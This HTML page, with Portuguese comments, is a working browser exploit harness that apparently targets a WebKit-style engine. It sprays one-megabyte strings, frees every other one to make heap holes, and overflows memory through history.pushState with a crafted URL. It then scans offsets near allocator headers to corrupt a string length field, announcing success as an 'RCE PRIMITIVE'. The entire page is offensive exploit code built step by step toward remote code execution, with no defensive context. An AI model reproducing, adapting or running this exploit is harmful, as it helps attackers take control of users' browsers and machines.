<!DOCTYPE html>
<html>
<head>
    <title>Wide Range Scanner (-128 bytes)</title>
    <style>
        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #00ff00; background: #1a1a1a; color: #fff; cursor: pointer; margin-bottom: 20px; }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; border: 4px solid white; }
        .hit { color: yellow; font-weight: bold; }
    </style>
</head>
<body>

    <h1>Scanner de Amplo Espectro (-128 bytes)</h1>
    <p>Procurando o campo Length em uma área maior antes dos dados.</p>

    <button onclick="startWideScan()">INICIAR VARREDURA PROFUNDA</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        // Ponto onde acertamos os DADOS (Referência)
        const DATA_HIT = 709520;
        const OVERFLOW_AMT = 1024 * 64; 

        // Configuração da Vítima (1MB TextDecoder)
        const TARGET_SIZE = 1024 * 1024; 
        const PAYLOAD_SIZE = TARGET_SIZE - 24; 

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : (type === 'hit' ? 'class="hit"' : '');
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

        async function startWideScan() {
            // Vamos recuar de 0 até 128 bytes, de 8 em 8.
            // Isso cobre cabeçalhos grandes de alocadores como jemalloc/bmalloc.
            
            for (let offsetBack = 0; offsetBack <= 128; offsetBack += 8) {
                let currentOffset = DATA_HIT - offsetBack;
                
                log(`------------------------------------------`);
                log(`TESTANDO OFFSET: ${currentOffset} (Recuo -${offsetBack})`);
                
                // Limpa memória anterior
                victims = [];
                await forceGC();
                await sleep(100);

                let result = await runTestAtOffset(currentOffset);
                
                if (result === "RCE") return; // Venceu
                if (result === "DATA") {
                    log(`Ainda em DADOS. Precisa recuar mais...`, 'hit');
                }
            }
            log("Fim da varredura.");
        }

        async function runTestAtOffset(offset) {
            try {
                // 1. Preparar Strings 1MB (8-bit)
                let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
                rawBuffer.fill(0x42); 
                let decoder = new TextDecoder("utf-8");
                let baseString = decoder.decode(rawBuffer);

                // 2. Spray
                victims = [];
                for(let i=0; i<60; i++) {
                    let s = i + "_" + baseString.substring((i+"_").length);
                    victims.push(s);
                }

                // 3. Buracos
                for(let i=0; i<60; i+=2) victims[i] = null;
                await forceGC();

                // 4. Exploit
                // Preenche até o offset atual e manda 0x01
                let buffer = "A".repeat(offset);
                buffer += "\x01".repeat(OVERFLOW_AMT);
                
                history.pushState({}, "scan_" + offset, "/" + buffer);

                // 5. Checagem
                for(let i=1; i<victims.length; i+=2) {
                    let s = victims[i];
                    if(!s) continue;

                    try {
                        let err = new Error(s);
                        let msg = err.message;

                        // CASO 1: LENGTH CORROMPIDO (VITÓRIA)
                        if (msg.length !== PAYLOAD_SIZE) {
                            log(`!!! JACKPOT !!! Length alterado no recuo -${DATA_HIT - offset}`, 'win');
                            log(`Novo Tamanho: ${msg.length}`, 'win');
                            alert("RCE PRIMITIVE UNLOCKED!");
                            return "RCE";
                        }
                        
                        // CASO 2: CONTEÚDO CORROMPIDO (DADOS)
                        // Se o primeiro byte virou 1, ainda estamos na zona de dados
                        if (msg.charCodeAt(0) === 1) {
                            return "DATA";
                        }

                    } catch(e) {}
                }

            } catch(e) {
                log("Erro (OOM): " + e.message);
            }
            return "FAIL";
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 400));
        }
    </script>
</body>
</html>
